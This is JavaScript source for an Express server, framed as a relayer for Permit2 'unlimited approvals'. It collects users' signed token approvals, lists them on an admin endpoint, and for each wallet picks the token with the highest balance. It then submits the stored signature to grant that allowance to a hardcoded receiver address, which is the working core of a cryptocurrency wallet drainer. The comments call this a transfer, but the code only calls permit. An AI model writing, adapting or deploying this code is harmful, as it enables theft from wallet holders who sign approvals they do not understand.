// Backend API for Permit2 Unlimited Approvals
// This server stores signatures and executes transfers on behalf of users

const express = require('express');
const { ethers } = require('ethers');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// ========== CONFIGURATION ==========
const PORT = process.env.PORT || 3000;
const RELAYER_KEY = process.env.RELAYER_PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE";
const RPC_URL = process.env.RPC_URL || "https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY";

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const RECEIVER_ADDRESS = "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9";

// Database (use MongoDB, PostgreSQL, or Redis in production)
const permitsDB = new Map();

// Relayer wallet (you pay gas from here)
const provider = new ethers.JsonRpcProvider(RPC_URL);
const relayer = new ethers.Wallet(RELAYER_KEY, provider);

console.log("🚀 Relayer address:", relayer.address);

// ========== PERMIT2 ABI ==========
const PERMIT2_ABI = [
  "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address owner, (tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature)",
  "function transferFrom((address from, address to, uint160 amount, address token)[] transferDetails) external"
];

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)"
];

// ========== API ENDPOINTS ==========

// Store permit signature
app.post('/api/permits/store', async (req, res) => {
  try {
    const { userAddress, chainId, tokens, signature, sigDeadline, timestamp } = req.body;
    
    if (!userAddress || !chainId || !tokens || !signature || !sigDeadline) {
      return res.status(400).json({ error: "Missing required fields" });
    }
    
    const key = `${userAddress.toLowerCase()}-${chainId}`;
    permitsDB.set(key, {
      userAddress: userAddress.toLowerCase(),
      chainId,
      tokens,
      signature,
      sigDeadline,
      timestamp,
      executed: false,
      executionTx: null,
      executionTime: null
    });
    
    console.log(`✓ Stored permit for ${userAddress} on chain ${chainId} (${tokens.length} tokens)`);
    
    res.json({ 
      success: true, 
      message: "Permit stored successfully",
      permitId: key
    });
  } catch (error) {
    console.error("Store permit error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Check if valid permit exists
app.get('/api/permits/check', (req, res) => {
  try {
    const { userAddress, chainId } = req.query;
    
    if (!userAddress || !chainId) {
      return res.status(400).json({ error: "Missing userAddress or chainId" });
    }
    
    const key = `${userAddress.toLowerCase()}-${chainId}`;
    const permit = permitsDB.get(key);
    
    if (!permit) {
      return res.json({ hasValidPermit: false });
    }
    
    // Check expiration
    const now = Math.floor(Date.now() / 1000);
    const valid = now < permit.sigDeadline && !permit.executed;
    
    res.json({ 
      hasValidPermit: valid,
      permitData: valid ? {
        tokens: permit.tokens,
        timestamp: permit.timestamp
      } : null
    });
  } catch (error) {
    console.error("Check permit error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Get all permits (for admin dashboard)
app.get('/api/permits/all', (req, res) => {
  try {
    const permits = Array.from(permitsDB.values());
    res.json({ permits });
  } catch (error) {
    console.error("Get all permits error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Execute transfer (called by admin or auto)
app.post('/api/permits/execute', async (req, res) => {
  try {
    const { userAddress, chainId } = req.body;
    
    if (!userAddress || !chainId) {
      return res.status(400).json({ error: "Missing userAddress or chainId" });
    }
    
    const key = `${userAddress.toLowerCase()}-${chainId}`;
    const permitData = permitsDB.get(key);
    
    if (!permitData) {
      return res.status(404).json({ error: "No permit found for this user" });
    }
    
    if (permitData.executed) {
      return res.status(400).json({ error: "Permit already executed" });
    }
    
    // Check expiration
    const now = Math.floor(Date.now() / 1000);
    if (now >= permitData.sigDeadline) {
      return res.status(400).json({ error: "Permit signature has expired" });
    }
    
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);
    
    // Find token with highest balance
    let bestToken = null;
    let maxBalance = 0n;
    
    for (const token of permitData.tokens) {
      const tokenContract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await tokenContract.balanceOf(userAddress);
      
      if (balance > maxBalance) {
        maxBalance = balance;
        bestToken = token;
      }
    }
    
    if (!bestToken || maxBalance === 0n) {
      return res.status(400).json({ error: "No token balance available to transfer" });
    }
    
    console.log(`Executing transfer: ${bestToken.symbol} from ${userAddress}`);
    console.log(`Balance: ${ethers.formatUnits(maxBalance, bestToken.decimals)} ${bestToken.symbol}`);
    
    // Execute using stored signature
    const tx = await permit2.permit(
      userAddress,
      {
        details: [{
          token: bestToken.address,
          amount: bestToken.amount,
          expiration: bestToken.expiration,
          nonce: bestToken.nonce
        }],
        spender: RECEIVER_ADDRESS,
        sigDeadline: permitData.sigDeadline
      },
      permitData.signature,
      { gasLimit: 300000 }
    );
    
    console.log(`TX sent: ${tx.hash}`);
    const receipt = await tx.wait();
    console.log(`✓ TX confirmed: ${tx.hash}`);
    
    // Calculate amounts
    const humanAmount = ethers.formatUnits(maxBalance, bestToken.decimals);
    const usdValue = parseFloat(humanAmount) * (bestToken.usdValue / parseFloat(ethers.formatUnits(bestToken.currentBalance, bestToken.decimals)));
    
    // Estimate gas cost in USD (simplified - use price oracle in production)
    const gasUsed = receipt.gasUsed;
    const gasPrice = receipt.gasPrice || receipt.effectiveGasPrice;
    const gasCostETH = ethers.formatEther(gasUsed * gasPrice);
    const gasCostUSD = (parseFloat(gasCostETH) * 2500).toFixed(2); // Assume ETH = $2500
    
    // Mark as executed
    permitData.executed = true;
    permitData.executionTx = tx.hash;
    permitData.executionTime = Date.now();
    permitsDB.set(key, permitData);
    
    res.json({
      success: true,
      txHash: tx.hash,
      tokenSymbol: bestToken.symbol,
      amount: humanAmount,
      amountUSD: usdValue.toFixed(2),
      gasCostUSD,
      explorerUrl: `https://etherscan.io/tx/${tx.hash}`
    });
    
  } catch (error) {
    console.error("Execution error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    relayer: relayer.address,
    permits: permitsDB.size
  });
});

app.listen(PORT, () => {
  console.log(`✓ API running on port ${PORT}`);
  console.log(`✓ Relayer: ${relayer.address}`);
  console.log(`✓ Receiver: ${RECEIVER_ADDRESS}`);
});
